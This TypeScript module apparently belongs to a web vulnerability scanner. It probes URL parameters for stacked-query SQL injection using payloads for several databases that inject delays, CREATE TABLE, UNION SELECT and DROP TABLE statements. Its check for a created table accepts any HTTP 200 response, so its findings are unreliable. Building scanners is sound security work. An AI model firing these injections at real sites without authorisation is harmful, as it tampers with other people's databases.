import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL } from 'url';
import crypto from 'crypto';
import { executeRequest, recordVulnerability, COMMON_FALLBACK_PARAMS } from './common';

// ============================================================================
// ⚙️ CONFIGURATION & CONSTANTS
// ============================================================================

const TIME_DELAY_THRESHOLD = 4500; // 4.5 seconds threshold
const TABLE_PREFIX = 'ds_proof_';

// ============================================================================
// 🛡️ ATTACK LOGIC
// ============================================================================

/**
 * Executes Stacked Queries Attack.
 * Focuses on executing administrative commands (CREATE/DROP TABLE) to prove RCE/Control.
 */
export async function executeStackedQueriesAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 5] 🏗️ Starting Stacked Queries (Command Execution) Attack...');
    
    let foundVulnerability = false;

    for (const param of COMMON_FALLBACK_PARAMS) {
        console.log(`\n[Vector 5] 🎯 Testing Parameter: [${param}]`);

        // Generate a unique, random table name for this specific attempt
        // This prevents collision with real tables or previous scans
        const uniqueTableName = `${TABLE_PREFIX}${crypto.randomBytes(4).toString('hex')}`;
        
        // Define payloads for this table
        const payloads = getStackedPayloads(uniqueTableName);

        for (const [dbType, executionPayload] of Object.entries(payloads)) {
            if (foundVulnerability) break; // Stop if already found for this param

            console.log(`[Vector 5]    Trying ${dbType} Execution...`);

            try {
                // 1. Measure Baseline (Clean Request)
                const baselineTime = await measureBaseline(targetUrl, param);

                // 2. Phase 1: Injection (Create Table + Delay)
                const injectionTime = await injectPayload(targetUrl, param, executionPayload);
                console.log(`[Vector 5]      Timing: Base=${baselineTime.toFixed(0)}ms, Inject=${injectionTime.toFixed(0)}ms`);

                let isTimeBased = false;
                if (injectionTime > baselineTime + TIME_DELAY_THRESHOLD) {
                    console.log(`[Vector 5] ✅ Time-based detection successful (${dbType})`);
                    isTimeBased = true;
                }

                // 3. Phase 2: Verification (Check if Table Exists)
                // Even if time-based failed (maybe async execution), the table might exist.
                const tableExists = await verifyTableExistence(targetUrl, param, uniqueTableName);
                
                if (tableExists || isTimeBased) {
                    const method = tableExists ? 'Table Creation Verification (High Confidence)' : 'Time-Based Delay (Medium Confidence)';
                    console.log(`[Vector 5] ✅ VULNERABILITY CONFIRMED via ${method}`);

                    const proof = `
                        Database: ${dbType}
                        Method: ${method}
                        Table Created: ${uniqueTableName}
                        Injection Payload: ${executionPayload}
                        Verification Result: ${tableExists ? 'Table Found' : 'Table Not Detected (Blind)'}
                    `.trim();

                    const description = `Stacked Query SQLi confirmed in '${param}'. The scanner successfully executed chained commands, proving arbitrary command execution capability.`;
                    
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
                    foundVulnerability = true;
                }

            } catch (error: any) {
                console.warn(`[Vector 5] ⚠️ Error during ${dbType} test: ${error.message}`);
            } finally {
                // 4. Phase 3: Cleanup (Always attempt to drop the table)
                // We run this in 'finally' to ensure we don't leave garbage behind, even if errors occur.
                await cleanupTable(targetUrl, param, uniqueTableName);
            }
        }
        
        if (foundVulnerability) break; // Move to next vector if found
    }

    return foundVulnerability;
}

// ============================================================================
// ⚡ HELPER FUNCTIONS
// ============================================================================

function getStackedPayloads(tableName: string) {
    return {
        MySQL: `'; SELECT SLEEP(5); CREATE TABLE ${tableName}(id INT); --`,
        PostgreSQL: `'; SELECT pg_sleep(5); CREATE TABLE ${tableName}(id INT); --`,
        MSSQL: `'; WAITFOR DELAY '0:0:5'; CREATE TABLE ${tableName}(id INT); --`,
        // SQLite rarely supports stacked queries via web apps, but worth a shot if configured loosely
        SQLite: `'; CREATE TABLE ${tableName}(id INT); --` 
    };
}

async function measureBaseline(targetUrl: string, param: string): Promise<number> {
    const url = new URL(targetUrl);
    if (!url.searchParams.has(param)) url.searchParams.set(param, '1');
    const { responseTime } = await executeRequest(url.toString());
    return responseTime;
}

async function injectPayload(targetUrl: string, param: string, payload: string): Promise<number> {
    const url = new URL(targetUrl);
    url.searchParams.set(param, payload);
    const { responseTime } = await executeRequest(url.toString());
    return responseTime;
}

async function verifyTableExistence(targetUrl: string, param: string, tableName: string): Promise<boolean> {
    // Payload to check if table exists. If it does, the query succeeds (usually 200 OK).
    // If not, it throws a SQL error (usually 500).
    // Using UNION SELECT 1 FROM tableName is a standard cross-db check.
    const verifyPayload = `' UNION SELECT 1 FROM ${tableName} --`;
    
    const url = new URL(targetUrl);
    url.searchParams.set(param, verifyPayload);
    
    const { response } = await executeRequest(url.toString());
    
    // If we get a 200 OK and NOT a standard error page, the table likely exists
    // Improving logic: Check if response differs significantly from a "table does not exist" query
    return response?.status === 200; 
}

async function cleanupTable(targetUrl: string, param: string, tableName: string): Promise<void> {
    const cleanupPayload = `'; DROP TABLE ${tableName}; --`;
    const url = new URL(targetUrl);
    url.searchParams.set(param, cleanupPayload);
    
    try {
        // Fire and forget cleanup
        await executeRequest(url.toString());
    } catch (e) { /* ignore cleanup errors */ }
}